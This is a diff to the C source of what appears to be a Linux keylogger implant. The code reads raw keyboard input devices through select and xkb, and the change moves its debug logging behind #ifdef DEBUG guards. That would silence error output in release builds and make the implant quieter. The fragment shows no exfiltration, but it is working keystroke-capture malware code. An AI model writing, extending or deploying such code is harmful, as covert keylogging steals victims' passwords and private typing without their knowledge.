@@ -33,11 +33,10 @@ static int log_keyboard(int fd, implant_t *instance, struct xkb_state *state) {
 
     ssize_t bytes_read = read(fd, &evt, sizeof(evt));
     if (bytes_read != sizeof(evt)) {
-        DEBUG_LOG(
-            instance->debug_enabled,
-            "[!] read() error: %s",
-            strerror(errno)
-        );
+
+#ifdef DEBUG
+        DEBUG_LOG("[!] read() error: %s", strerror(errno));
+#endif
 
         return ERROR;
     }
@@ -67,10 +66,11 @@ void keylog(implant_t *instance) {
     int status = 0;
 
     if (highest_fd < 0) {
-        DEBUG_LOG(
-            instance->debug_enabled,
-            "[!] no keyboard found. exiting"
-        );
+
+#ifdef DEBUG
+        DEBUG_LOG("[!] no keyboard found. exiting");
+#endif
+
         return;
     }
 
@@ -88,11 +88,10 @@ void keylog(implant_t *instance) {
 
     context = xkb_context_new(0);
     if (!context) {
-        DEBUG_LOG(
-            instance->debug_enabled,
-            "[!] error with xkb_context_new(): %s",
-            strerror(errno)
-        );
+
+#ifdef DEBUG
+        DEBUG_LOG("[!] error with xkb_context_new(): %s", strerror(errno));
+#endif
 
         return;
 
@@ -100,22 +99,20 @@ void keylog(implant_t *instance) {
 
     keymap = xkb_keymap_new_from_names(context, NULL, 0);
     if (!keymap) {
-        DEBUG_LOG(
-            instance->debug_enabled,
-            "[!] error with xkb_keymap_new_from_names(): %s",
-            strerror(errno)
-        );
+
+#ifdef DEBUG
+        DEBUG_LOG("[!] error with xkb_keymap_new_from_names(): %s", strerror(errno));
+#endif
 
         goto LOG_FUNCTION_CLEANUP;
     }
 
     state = xkb_state_new(keymap);
     if (!state) {
-        DEBUG_LOG(
-            instance->debug_enabled,
-            "[!] error with xkb_state_new(): %s",
-            strerror(errno)
-        );
+
+#ifdef DEBUG
+        DEBUG_LOG("[!] error with xkb_state_new(): %s", strerror(errno));
+#endif
 
         goto LOG_FUNCTION_CLEANUP;
     }
@@ -134,11 +131,10 @@ void keylog(implant_t *instance) {
         /* check if a key has been pressed */
         status = select(highest_fd + 1, &rd, NULL, &err, (instance->debug_enabled) ? &(struct timeval){1, 0}: NULL);
         if (status < 0) {
-            DEBUG_LOG(
-                instance->debug_enabled,
-                "[!] select error: %s",
-                strerror(errno)
-            );
+
+#ifdef DEBUG
+            DEBUG_LOG("[!] select error: %s", strerror(errno));
+#endif
 
             goto LOG_FUNCTION_CLEANUP;
         }
@@ -147,11 +143,10 @@ void keylog(implant_t *instance) {
         it = NULL;
         TAILQ_FOREACH(it, &instance->kbd, devices) {
             if (FD_ISSET(it->fd, &err)) {
-                DEBUG_LOG(
-                    instance->debug_enabled,
-                    "[!] Error on file descriptor %d",
-                    it->fd
-                );
+
+#ifdef DEBUG
+                DEBUG_LOG("[!] Error on file descriptor %d", it->fd);
+#endif
 
                 /* keyboard has been un-plugged, let's continue */
                 close(it->fd);
